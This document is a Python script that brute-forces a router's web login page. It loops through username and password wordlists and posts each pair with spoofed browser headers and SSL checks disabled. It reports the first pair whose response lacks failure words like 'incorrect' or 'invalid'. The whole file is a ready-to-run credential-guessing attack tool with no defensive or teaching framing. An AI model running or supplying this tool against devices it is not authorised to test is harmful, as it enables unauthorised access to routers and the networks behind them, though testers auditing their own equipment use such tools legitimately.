import requests
import sys

url = input("Router's ip (default: 192.168.1.1): ") # Be sure about the router ip

if not url:
    url = 'http://192.168.1.1'

expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser", b"fail"}

def brute(username, password, combinations_tested, total_combinations):
    data = {'username': username, 'password': password}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Referer': 'http://192.168.1.1/',
        'Origin': 'http://192.168.1.1/',
    }
    try:
        a = requests.post(url, data=data, headers=headers, verify=False)
        r_content = a.content.lower()
    except requests.exceptions.SSLError as e:
        print("Erro de SSL:", e)
        sys.exit(1)
    combinations_tested += 1
    sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
    sys.stdout.flush()
    if b"upgrade" in r_content or b"outdated" in r_content or b"browser" in r_content:
        print("\nError:", r_content)
        sys.exit()
    if not any(item in r_content for item in expression):
        print("\nBrute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        print("Server Response:", r_content)
        sys.exit()
    return combinations_tested

def main():
    combinations_tested = 0
    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
    total_combinations = len(usernames) * len(passwords)
    try:
        for username in usernames:
            for password in passwords:
                combinations_tested = brute(username, password, combinations_tested, total_combinations)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")

if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    main()
